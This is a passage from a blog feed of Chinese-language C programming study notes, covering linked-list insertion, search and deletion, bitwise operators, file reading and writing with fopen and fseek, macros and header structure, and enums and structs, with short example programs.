class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">typedef struct _node&#123;</span><br><span class="line">    int value;</span><br><span class="line">    struct _node *next;</span><br><span class="line">&#125;Node;</span><br><span class="line">typedef struct _list&#123;</span><br><span class="line">    Node *head;</span><br><span class="line">    //Node *tail;</span><br><span class="line">&#125;List;</span><br><span class="line">void add(List *pList, int number);</span><br><span class="line">void print(List *pList);</span><br><span class="line">int main()&#123;</span><br><span class="line">    List list;</span><br><span class="line">    list.head = NULL;</span><br><span class="line">    int number;</span><br><span class="line">    do&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">        if(number != -1)&#123;</span><br><span class="line">            add(&amp;list,number);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; while(number != -1);</span><br><span class="line">    print(&amp;list); </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">void add(List *pList, int number)&#123;</span><br><span class="line">    //    add to linkList</span><br><span class="line">    Node *p = (Node*)malloc(sizeof(Node));</span><br><span class="line">    p-&gt;value = number;</span><br><span class="line">    p-&gt;next = NULL;</span><br><span class="line">    //    find the last</span><br><span class="line">    Node *last = pList-&gt;head;</span><br><span class="line">    if(last)&#123;</span><br><span class="line">        while(last-&gt;next)&#123;</span><br><span class="line">        last = last-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        //    attach</span><br><span class="line">        last-&gt;next = p;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        pList-&gt;head = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void print(List *pList)&#123;</span><br><span class="line">    Node *p;</span><br><span class="line">    //遍历输出 </span><br><span class="line">    for(p=pList-&gt;head;p;p=p-&gt;next)&#123;</span><br><span class="line">        printf(&quot;%d\t&quot;,p-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Test Result</li></ul><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185436.png" alt="image-20200307142325721" title="image-20200307142325721"></p><h3 id="10-4-链表查找数据并删除"><a href="#10-4-链表查找数据并删除" class="headerlink" title="10.4 链表查找数据并删除"></a>10.4 链表查找数据并删除</h3><blockquote><p>链表查找数据并删除</p></blockquote><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">typedef struct _node&#123;</span><br><span class="line">    int value;</span><br><span class="line">    struct _node *next;</span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line">typedef struct _list&#123;</span><br><span class="line">    Node *head;</span><br><span class="line">    //Node *tail;</span><br><span class="line">&#125;List;</span><br><span class="line">void add(List *pList, int number);</span><br><span class="line">void print(List *pList);</span><br><span class="line">int main()&#123;</span><br><span class="line">    List list;</span><br><span class="line">    list.head = NULL;</span><br><span class="line">    int number;</span><br><span class="line">    do&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">        if(number != -1)&#123;</span><br><span class="line">            add(&amp;list,number);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; while(number != -1);</span><br><span class="line">    print(&amp;list); </span><br><span class="line">    //查找数据 </span><br><span class="line">    scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">    Node *p;</span><br><span class="line">    int isFound = 0;</span><br><span class="line">    for(p=list.head;p;p=p-&gt;next)&#123;</span><br><span class="line">        if(p-&gt;value == number)&#123;</span><br><span class="line">            printf(&quot;找到了\n&quot;);</span><br><span class="line">            isFound = 1;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if(!isFound)&#123;</span><br><span class="line">        printf(&quot;没有找到\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    //删除某个数据 </span><br><span class="line">    Node *q;</span><br><span class="line">    for(q=NULL,p=list.head;p;q=p,p=p-&gt;next)&#123;</span><br><span class="line">        if(p-&gt;value == number)&#123;</span><br><span class="line">            if(q)&#123;</span><br><span class="line">                q-&gt;next = p-&gt;next;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                list.head = p-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            free(p);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //删除所有数据</span><br><span class="line">    for(p=list.head;p;p=q)&#123;</span><br><span class="line">        q = p-&gt;next;</span><br><span class="line">        free(p);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">void add(List *pList, int number)&#123;</span><br><span class="line">    //    add to linkList</span><br><span class="line">    Node *p = (Node*)malloc(sizeof(Node));</span><br><span class="line">    p-&gt;value = number;</span><br><span class="line">    p-&gt;next = NULL;</span><br><span class="line">    //    find the last</span><br><span class="line">    Node *last = pList-&gt;head;</span><br><span class="line">    if(last)&#123;</span><br><span class="line">        while(last-&gt;next)&#123;</span><br><span class="line">        last = last-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        //    attach</span><br><span class="line">        last-&gt;next = p;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        pList-&gt;head = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void print(List *pList)&#123;</span><br><span class="line">    Node *p;</span><br><span class="line">    //遍历输出 </span><br><span class="line">    for(p=pList-&gt;head;p;p=p-&gt;next)&#123;</span><br><span class="line">        printf(&quot;%d\t&quot;,p-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记第九章 位运算</title>
      <link href="/43.html"/>
      <url>/43.html</url>
      
        <content type="html"><![CDATA[<h2 id="9-1-按位运算"><a href="#9-1-按位运算" class="headerlink" title="9.1 按位运算"></a>9.1 按位运算</h2><ul><li><p>C 有这些按位运算的运算符：</p><ul><li>&amp; 按位与</li><li>按位或</li><li>~ 按位取反</li><li>^ 按位异或</li><li>&lt;&lt; 左移</li><li><code>&gt;&gt;</code> 右移</li></ul></li></ul><h2 id="9-2-移位运算"><a href="#9-2-移位运算" class="headerlink" title="9.2 移位运算"></a>9.2 移位运算</h2><ul><li>按位运算输出 int</li><li>左移</li></ul><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185410.png" alt="image-20200306212541735" title="image-20200306212541735"></p><ul><li>右移</li></ul><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185414.png" alt="image-20200306212636652" title="image-20200306212636652"></p><p>{cat_tips_B}注：移位的位数不要用负数，这是没有定义的行为{&#x2F;cat_tips_B}</p><h2 id="9-3-位段"><a href="#9-3-位段" class="headerlink" title="9.3 位段"></a>9.3 位段</h2><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185421.png" alt="image-20200306213148645" title="image-20200306213148645"></p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185425.png" alt="image-20200306213254105" title="image-20200306213254105"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记第八章 文件</title>
      <link href="/42.html"/>
      <url>/42.html</url>
      
        <content type="html"><![CDATA[<h2 id="8-1-文件输入输出"><a href="#8-1-文件输入输出" class="headerlink" title="8.1 文件输入输出"></a>8.1 文件输入输出</h2><ul><li>linux 用 &gt; 和 &lt; 做重定向</li></ul><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185336.png" alt="image-20200306180200439" title="image-20200306180200439"></p><ul><li>打开文件的标准代码：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FILE *fp = fopen(&quot;file&quot;,&quot;r&quot;);</span><br><span class="line">if(fp)&#123;</span><br><span class="line">    fscanf(fp,...);</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">int main(int argc,char const *argv[])&#123;</span><br><span class="line">    FILE *fp = fopen(&quot;12.in&quot;,&quot;r&quot;);</span><br><span class="line">    if(fp)&#123;</span><br><span class="line">        int num;</span><br><span class="line">        fscanf(fp,&quot;%d&quot;,&amp;num);</span><br><span class="line">        printf(&quot;%d\n&quot;,num);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        printf(&quot;无法打开文件\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h3><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185344.png" alt="image-20200306181622981" title="image-20200306181622981"></p><h2 id="8-2-二进制文件"><a href="#8-2-二进制文件" class="headerlink" title="8.2 二进制文件"></a>8.2 二进制文件</h2><ul><li><p>其实所有的文件最终都是二进制的</p></li><li><p>文本文件读写：</p><ul><li>more、tail</li><li>cat</li><li>vi</li></ul></li><li><p>二进制文件需要专门的程序来读写</p></li><li><p>文本文件的输入输出是格式化，可能经过转码</p></li></ul><h2 id="8-3-文件练习题"><a href="#8-3-文件练习题" class="headerlink" title="8.3 文件练习题"></a>8.3 文件练习题</h2><h3 id="文件练习举例"><a href="#文件练习举例" class="headerlink" title="文件练习举例"></a>文件练习举例</h3><ul><li><p>Example 01：</p><ul><li>student.h</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#ifndef _STUDENT_H_</span><br><span class="line">#define _STUDENT_H_</span><br><span class="line">//const int STR_LEN = 20;</span><br><span class="line">#define STR_LEN 20</span><br><span class="line">typedef struct _student&#123;</span><br><span class="line">    char name[STR_LEN];</span><br><span class="line">    int gender;</span><br><span class="line">    int age;</span><br><span class="line">&#125;Student;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><ul><li>main.c</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &quot;student.h&quot;</span><br><span class="line">void getList(Student aStu[],int number);</span><br><span class="line">int save(Student aStu[],int number);</span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    int number = 0;</span><br><span class="line">    printf(&quot;输入学生数量：&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">    Student aStu[number];</span><br><span class="line">    getList(aStu,number);</span><br><span class="line">    if(save(aStu,number))&#123;</span><br><span class="line">        printf(&quot;保存成功\n&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    printf(&quot;保存失败\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">void getList(Student aStu[],int number)&#123;</span><br><span class="line">    char format[STR_LEN];</span><br><span class="line">    //向字符串输出 </span><br><span class="line">    sprintf(format,&quot;%%%ds&quot;,STR_LEN-1);</span><br><span class="line">    //%19s </span><br><span class="line">    int i;</span><br><span class="line">    for(i=0;i&lt;number;i++)&#123;</span><br><span class="line">    printf(&quot;第%d个学生：\n&quot;,i);</span><br><span class="line">    printf(&quot;\t姓名：&quot;);</span><br><span class="line">    scanf(format,aStu[i].name); </span><br><span class="line">    printf(&quot;\t性别(0-男，1-女，2-其他)：&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;aStu[i].gender);</span><br><span class="line">    printf(&quot;\t年龄：&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;aStu[i].age); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int save(Student aStu[],int number)&#123;</span><br><span class="line">    int ret = -1;</span><br><span class="line">    FILE *fp = fopen(&quot;student.data&quot;,&quot;w&quot;);</span><br><span class="line">    if(fp)&#123;</span><br><span class="line">        ret = fwrite(aStu,sizeof(Student),number,fp);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    return ret == number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>测试结果：</li></ul><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185351.png" alt="image-20200306204450498" title="image-20200306204450498"></p><h3 id="8-4-文件中定位"><a href="#8-4-文件中定位" class="headerlink" title="8.4 文件中定位"></a>8.4 文件中定位</h3><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185754.png" alt="image-20200306204846477" title="image-20200306204846477"></p><ul><li><p>Example 02：</p><ul><li>read.c</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &quot;student.h&quot;</span><br><span class="line">void read(FILE *fp,int index);</span><br><span class="line">int main()&#123;</span><br><span class="line">    FILE *fp = fopen(&quot;student.data&quot;,&quot;r&quot;);</span><br><span class="line">    if(fp)&#123;</span><br><span class="line">        fseek(fp,0L,SEEK_END);</span><br><span class="line">        long size = ftell(fp);</span><br><span class="line">        int number = size / sizeof(Student);</span><br><span class="line">        int index = 0;</span><br><span class="line">        printf(&quot;有%d个数据，你要看第几个：&quot;,number);</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;index);</span><br><span class="line">        read(fp,index-1);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">void read(FILE *fp,int index)&#123;</span><br><span class="line">    fseek(fp,index * sizeof(Student),SEEK_SET);</span><br><span class="line">    Student stu;</span><br><span class="line">    if(fread(&amp;stu,sizeof(Student),1,fp) == 1)&#123;</span><br><span class="line">        printf(&quot;第%d个学生：&quot;,index+1);</span><br><span class="line">        printf(&quot;\t姓名：%s\n&quot;,stu.name);</span><br><span class="line">        printf(&quot;\t性别：&quot;);</span><br><span class="line">        switch(stu.gender) &#123;</span><br><span class="line">            case 0:printf(&quot;男\n&quot;);break;</span><br><span class="line">            case 1:printf(&quot;女\n&quot;);break;</span><br><span class="line">            case 2:printf(&quot;其他\n&quot;);break;</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;\t年龄：%d\n&quot;,stu.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Test Result:</li></ul><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185358.png" alt="image-20200306210748268" title="image-20200306210748268"></p><ul><li>可移植性</li></ul><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185404.png" alt="image-20200306211106200" title="image-20200306211106200"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 文件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记第七章 程序结构</title>
      <link href="/41.html"/>
      <url>/41.html</url>
      
        <content type="html"><![CDATA[<h3 id="7-1-全局变量"><a href="#7-1-全局变量" class="headerlink" title="7.1 全局变量"></a>7.1 全局变量</h3><h4 id="全局变量初始化"><a href="#全局变量初始化" class="headerlink" title="全局变量初始化"></a>全局变量初始化</h4><ul><li>默认初始化为0，指针会得到NULL</li><li>尽量不要使用全局变量来在函数间传递参数和结果</li></ul><h3 id="7-2-静态本地变量"><a href="#7-2-静态本地变量" class="headerlink" title="7.2 静态本地变量"></a>7.2 静态本地变量</h3><ul><li>static</li><li>使用全局变量和静态本地变量的函数是线程不安全的</li></ul><h3 id="7-3-编译预处理和宏"><a href="#7-3-编译预处理和宏" class="headerlink" title="7.3 编译预处理和宏"></a>7.3 编译预处理和宏</h3><h4 id="编译预处理指令"><a href="#编译预处理指令" class="headerlink" title="编译预处理指令"></a>编译预处理指令</h4><ul><li><code>#</code>开头的是编译预处理指令</li><li>它们不是c语言的成分，但是c语言程序离不开它们</li><li><code>#define</code> 用来定义一个宏，原始的文本替换</li><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">//const double PI = 3.14159; </span><br><span class="line">#define PI 3.14159</span><br><span class="line">int main()&#123;    </span><br><span class="line">   printf(&quot;%f\n&quot;,2*PI);      </span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 02：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">//const double PI = 3.14159; </span><br><span class="line">#define PI 3.14159</span><br><span class="line">#define PI2 2*PI  // PI * 2</span><br><span class="line">#define PRT printf(&quot;%f &quot;,PI); \</span><br><span class="line">        printf(&quot;%f\n&quot;,PI2)</span><br><span class="line">int main()&#123;</span><br><span class="line">    //    printf(&quot;%f\n&quot;,PI);</span><br><span class="line">    //    printf(&quot;%f\n&quot;,PI2);</span><br><span class="line">        PRT;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="define"><a href="#define" class="headerlink" title="define"></a>define</h4><ul><li>有值的宏：参考上面 Example 02</li><li>没有值的宏：#define _DEBUG &#x2F;&#x2F; 这类宏适用于条件编译，后面有其他的编译预处理指令来检查这个宏是否已经被定义过了</li></ul><h4 id="预定义的宏"><a href="#预定义的宏" class="headerlink" title="预定义的宏"></a>预定义的宏</h4><ul><li>LINE</li><li>FILE</li><li>DATE</li><li>TIME</li><li>STDC</li><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">int main()&#123;</span><br><span class="line">    printf(&quot;%s:%d\n&quot;,__FILE__,__LINE__);</span><br><span class="line">    printf(&quot;%s:%s\n&quot;,__DATE__,__LINE__);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="像函数的宏"><a href="#像函数的宏" class="headerlink" title="像函数的宏"></a>像函数的宏</h4><ul><li><code>#define cube(x) ( (x) * (x) * (x) )</code></li><li>宏可以带参数</li><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#define cube(x) ((x)*(x)*(x))     </span><br><span class="line">int main(int argc,char const *argv[])&#123;</span><br><span class="line">    int i;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;i);</span><br><span class="line">    printf(&quot;%d\n&quot;,cube(i));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>带参数的宏的原则：</p><ul><li><p>一切都要括号</p><ul><li>整个值要括号</li><li>参数出现的每个地方都要括号</li></ul></li><li><p><code>#define RADTODEG(x) ( (x) * 57.29578 )</code></p></li></ul></li><li><p>宏可以带多个参数：</p><ul><li><code>#define MIN(a,b) ((a)&gt;(b)?(b):(a))</code></li></ul></li><li><p>宏也可以组合(嵌套)使用其他宏</p></li></ul><h3 id="7-4-大程序结构"><a href="#7-4-大程序结构" class="headerlink" title="7.4 大程序结构"></a>7.4 大程序结构</h3><h4 id="多个-c-文件"><a href="#多个-c-文件" class="headerlink" title="多个 .c 文件"></a>多个 .c 文件</h4><ul><li>在 Dev C++ 中新建一个项目，然后把几个源代码文件加入进去，然后编译和构建运行即可。</li></ul><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185318.png" alt="image-20200306171635923" title="image-20200306171635923"></p><ul><li><p>编译单元</p><ul><li>一个 .c 文件是一个编译单元</li><li>编译器每次编译只处理一个编译单元</li></ul></li><li><p>引入头文件</p><ul><li>把函数原型放在一个头文件(以 .h 结尾)中，在需要调用这个函数的源代码文件( .c 文件)中 #include 这个头文件，就可以让编译器在编译的时候知道函数的原型。</li></ul></li></ul><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185322.png" alt="image-20200306173027863" title="image-20200306173027863"></p><h4 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h4><p>在 .h 中添加 extern int gAll; 就能使用 gAll 了</p><ul><li><p>int i; &#x2F;&#x2F;是变量的定义</p></li><li><p>extern int i; &#x2F;&#x2F;是变量的声明</p></li><li><p>声明不产生代码，定义产生代码</p></li><li><p>声明包括：</p><ul><li>函数原型</li><li>变量声明</li><li>结构声明</li><li>宏声明</li><li>枚举声明</li><li>类型声明</li><li>inline 声明</li></ul></li><li><p>只有声明才能放在头文件中</p></li></ul><h4 id="标准头文件结构"><a href="#标准头文件结构" class="headerlink" title="标准头文件结构"></a>标准头文件结构</h4><ul><li>条件编译指令</li><li><code>#ifndef _ MAX_H _</code> &#x2F;&#x2F;如果没有定义</li><li><code>#define _ MAX_H _</code> &#x2F;&#x2F;则定义</li><li><code>#endif</code></li><li>避免了重复引用的情况</li></ul><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423183514.png" alt="image-20200306175006974" title="image-20200306175006974"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 程序结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记第六章 结构类型</title>
      <link href="/40.html"/>
      <url>/40.html</url>
      
        <content type="html"><![CDATA[<h3 id="6-1-枚举"><a href="#6-1-枚举" class="headerlink" title="6.1 枚举"></a>6.1 枚举</h3><p>{cat_tips_E}用枚举优化常量符号化，变得更加方便{&#x2F;cat_tips_E}</p><ul><li>enum 枚举类型名字{名字0,…,名字n};</li><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">enum color&#123;</span><br><span class="line">    red,</span><br><span class="line">    yellow,</span><br><span class="line">    green</span><br><span class="line">&#125;;</span><br><span class="line">void f(enum color c);</span><br><span class="line">int main()&#123;</span><br><span class="line">    enum color t = red;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;t);</span><br><span class="line">    f(t);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">void f(enum color c)&#123;</span><br><span class="line">    printf(&quot;%d\n&quot;,c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>{cat_tips_E}枚举量{&#x2F;cat_tips_E}</p><ul><li>声明枚举量的时候可以指定值</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enum color&#123;</span><br><span class="line">  red = 1,</span><br><span class="line">  yellow,</span><br><span class="line">  green = 5</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>枚举只是int</p><p>实际上很少用</p></blockquote><h3 id="6-2-结构体"><a href="#6-2-结构体" class="headerlink" title="6.2 结构体"></a>6.2 结构体</h3><p>{cat_tips_E}声明结构类型{&#x2F;cat_tips_E}</p><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 